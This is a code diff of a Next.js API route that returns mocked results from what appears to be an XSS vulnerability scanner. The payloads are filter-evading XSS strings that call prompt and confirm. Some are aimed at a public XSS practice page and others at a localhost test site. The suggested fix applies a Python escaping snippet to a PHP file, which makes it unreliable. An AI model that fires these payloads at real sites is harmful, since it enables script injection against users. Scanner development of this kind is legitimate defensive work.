@@ -1,113 +1,197 @@
 // Next.js API route support: https://nextjs.org/docs/api-routes/introduction
 
+
+
 export default function handler(req, res) {
   
     if (req.method === 'GET') {
-        
-    const response = [
+  
+  
+      // get param from url ?target_url
+      //const target_url = req.query.target_url;
+      let result = [
         {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p06=\"><A%0aONPOintERenter%0a=%0aa=prompt,a()>v3dm0s",
-            "payloads": "\"><A%0aONPOintERenter%0a=%0aa=prompt,a()>v3dm0s"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p06=\"><HTmL%0doNMOUSEoveR%0a=%0aconfirm()//",
-            "payloads": "\"><HTmL%0doNMOUSEoveR%0a=%0aconfirm()//"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p06=\"><d3v/+/ONPoinTErenter+=+confirm()>v3dm0s",
-            "payloads": "\"><d3v/+/ONPoinTErenter+=+confirm()>v3dm0s"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p06=\"><d3v%0aonPoiNtEREnTer%0a=%0a[8].find(confirm)%0dx>v3dm0s",
-            "payloads": "\"><d3v%0aonPoiNtEREnTer%0a=%0a[8].find(confirm)%0dx>v3dm0s"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p07='><htML%09ONMOuSEoVeR+=+a=prompt,a()%0dx>",
-            "payloads": "'><htML%09ONMOuSEoVeR+=+a=prompt,a()%0dx>"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p07='><A%0dOnmouseoVeR%0d=%0dconfirm()%0dx>v3dm0s",
-            "payloads": "'><A%0dOnmouseoVeR%0d=%0dconfirm()%0dx>v3dm0s"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p07='><a%0dOnmouseOveR%0a=%0a(prompt)``%0dx>v3dm0s",
-            "payloads": "'><a%0dOnmouseOveR%0a=%0a(prompt)``%0dx>v3dm0s"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p07='><dETails%0aONPoINtEREnter%09=%09[8].find(confirm)%0dx>",
-            "payloads": "'><dETails%0aONPoINtEREnter%09=%09[8].find(confirm)%0dx>"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p08=\"/+/AUtOfOCUs/+/onfOcUs=\"(prompt)``",
-            "payloads": "\"/+/AUtOfOCUs/+/onfOcUs=\"(prompt)``"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p08=\"%0daUToFOCUs%0dOnfOcus=\"(confirm)()",
-            "payloads": "\"%0daUToFOCUs%0dOnfOcus=\"(confirm)()"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p08=\"%0dAutofOcUS%0donFOcus=\"(prompt)``",
-            "payloads": "\"%0dAutofOcUS%0donFOcus=\"(prompt)``"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p08=\"%09AuTofocuS%09ONfoCUs=\"confirm()",
-            "payloads": "\"%09AuTofocuS%09ONfoCUs=\"confirm()"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p09='%09AuTOFoCUs%09OnFOcUs='confirm()",
-            "payloads": "'%09AuTOFoCUs%09OnFOcUs='confirm()"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p09='/+/aUtofoCus/+/ONfoCuS='a=prompt,a()",
-            "payloads": "'/+/aUtofoCus/+/ONfoCuS='a=prompt,a()"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p09='/+/autOfOcUS/+/onfOCUS='(confirm)()",
-            "payloads": "'/+/autOfOcUS/+/onfOCUS='(confirm)()"
-        },
-        {
-            "AttackType": "XSS",
-            "Success": true,
-            "target_url": "https://brutelogic.com.br/gym.php?p09='%0dauTOfOCus%0dONfOCUs='confirm()",
-            "payloads": "'%0dauTOfOCus%0dONfOCUs='confirm()"
+            "list_vulnerability": [
+                {
+                    "corrections": {
+                        "explanation_xss": "An XSS attack, or Cross-Site Scripting, is a type of computer attack where a hacker injects malicious code, usually JavaScript, into a website. This code is then executed on the browsers of users visiting the compromised site, enabling the hacker to steal personal information, take control of user accounts, or redirect users to malicious sites. XSS attacks exploit vulnerabilities in web applications, often by manipulating input fields or other interactive fields.",
+                        "line_vuln": "file : C:\\wamp64\\www\\site-test\\pages\\xss.php line : 40 \n        <input type=\"text\" id=\"title\" name=\"title\" required><br><br>",
+                        "list_corrections": [
+                            {
+                                "correction_explanation": "In your line of code, there is an opportunity for a user to insert malicious code. To prevent this threat, we recommend using the escape() function, which escapes malicious special characters. Applying this security measure ensures that user input is processed securely, minimising the risk of malicious code being injected into the system.",
+                                "line_correction": "import html \nescaped_string = html.escape('<script>alert('Hello')</script>')\nprint(escaped_string)",
+                                "title": "Correction Escape the Output"
+                            }
+                        ]
+                    },
+                    "parameter": "title",
+                    "payloads": [
+                        {
+                            "payload": "<d3v onmouseover = [8].find(confirm)  >v3dm0s"
+                        },
+                        {
+                            "payload": "<d3v onmouseover = a=prompt,a()  >v3dm0s"
+                        },
+                        {
+                            "payload": "<a onpointerenter = confirm()>v3dm0s"
+                        },
+                        {
+                            "payload": "<details ontoggle = (prompt)``>"
+                        },
+                        {
+                            "payload": "<a onpointerenter = (prompt)``>v3dm0s"
+                        },
+                        {
+                            "payload": "<a onpointerenter = (prompt)``  >v3dm0s"
+                        },
+                        {
+                            "payload": "<details ontoggle = confirm()  //"
+                        },
+                        {
+                            "payload": "<d3v onpointerenter = a=prompt,a()  >v3dm0s"
+                        },
+                        {
+                            "payload": "<html onpointerenter = confirm()  >"
+                        },
+                        {
+                            "payload": "<d3v onmouseover = confirm()  >v3dm0s"
+                        },
+                        {
+                            "payload": "<d3v onmouseover = confirm()>v3dm0s"
+                        },
+                        {
+                            "payload": "<a onmouseover = (prompt)``>v3dm0s"
+                        },
+                        {
+                            "payload": "<details ontoggle = (confirm)()  >"
+                        },
+                        {
+                            "payload": "<a onpointerenter = a=prompt,a()  >v3dm0s"
+                        },
+                        {
+                            "payload": "<html onmouseover = a=prompt,a()>"
+                        },
+                        {
+                            "payload": "<details ontoggle = a=prompt,a()  >"
+                        }
+                    ]
+                },
+                {
+                    "corrections": {
+                        "explanation_xss": "An XSS attack, or Cross-Site Scripting, is a type of computer attack where a hacker injects malicious code, usually JavaScript, into a website. This code is then executed on the browsers of users visiting the compromised site, enabling the hacker to steal personal information, take control of user accounts, or redirect users to malicious sites. XSS attacks exploit vulnerabilities in web applications, often by manipulating input fields or other interactive fields.",
+                        "line_vuln": "file : C:\\wamp64\\www\\site-test\\pages\\xss.php line : 43 \n        <textarea id=\"content\" name=\"content\" rows=\"5\" cols=\"40\" required></textarea><br><br>",
+                        "list_corrections": [
+                            {
+                                "correction_explanation": "In your line of code, there is an opportunity for a user to insert malicious code. To prevent this threat, we recommend using the escape() function, which escapes malicious special characters. Applying this security measure ensures that user input is processed securely, minimising the risk of malicious code being injected into the system.",
+                                "line_correction": "import html \nescaped_string = html.escape('<script>alert('Hello')</script>')\nprint(escaped_string)",
+                                "title": "Correction Escape the Output"
+                            }
+                        ]
+                    },
+                    "parameter": "content",
+                    "payloads": [
+                        {
+                            "payload": "<details onpointerenter = [8].find(confirm)//"
+                        },
+                        {
+                            "payload": "<d3v onmouseover = (confirm)()>v3dm0s"
+                        },
+                        {
+                            "payload": "<html onmouseover = confirm()>"
+                        },
+                        {
+                            "payload": "<details ontoggle = a=prompt,a()  >"
+                        },
+                        {
+                            "payload": "<d3v onmouseover = [8].find(confirm)>v3dm0s"
+                        },
+                        {
+                            "payload": "<details ontoggle = [8].find(confirm)  >"
+                        },
+                        {
+                            "payload": "<a onpointerenter = confirm()  >v3dm0s"
+                        },
+                        {
+                            "payload": "<details ontoggle = (prompt)``>"
+                        },
+                        {
+                            "payload": "<html onmouseover = [8].find(confirm)//"
+                        },
+                        {
+                            "payload": "<a onpointerenter = a=prompt,a()>v3dm0s"
+                        },
+                        {
+                            "payload": "<d3v onpointerenter = (confirm)()>v3dm0s"
+                        },
+                        {
+                            "payload": "<details ontoggle = (prompt)``//"
+                        },
+                        {
+                            "payload": "<html onpointerenter = [8].find(confirm)  //"
+                        },
+                        {
+                            "payload": "<html onpointerenter = confirm()  >"
+                        },
+                        {
+                            "payload": "<html onpointerenter = (prompt)``  >"
+                        },
+                        {
+                            "payload": "<details onpointerenter = (prompt)``>"
+                        }
+                    ]
+                }
+            ],
+            "url": "http://localhost/site-test/pages/xss"
         }
     ]
-       
   
-    
-  
-      res.status(200).json(response)
       
+   function FilterXSS(result) {
+  
+      var XSSLogs = []
+
+      var current_time = new Date().getTime()
+  
+      try{
+  
+        // loop all payloads and add them into XSSLogs with a dict format
+  
+        for (var i = 0; i < result.length; i++) {
+            
+            for (var j = 0; j < result[i].list_vulnerability.length; j++) {
+    
+              for (var k = 0; k < result[i].list_vulnerability[j].payloads.length; k++) {
+    
+                XSSLogs.push({
+                  "target_url": result[i].url + "?" + result[i].list_vulnerability[j].parameter + "=" + result[i].list_vulnerability[j].payloads[k].payload,
+                  "AttackType": "xss",
+                  "payload": result[i].list_vulnerability[j].payloads[k].payload,
+                  "Success": true,
+                  "corrections": result[i].list_vulnerability[j].corrections,
+                    "time": current_time
+                })
+    
+              }
+    
+            }
+    
+          }
+        
+  
+      }
+      catch(err){
+  
+        console.log(err)
+  
+      }
+  
+      return XSSLogs
+  
+  }
+  
+  console.log(FilterXSS(result))
+      
+      res.status(200).json(FilterXSS(result))
   
   
   
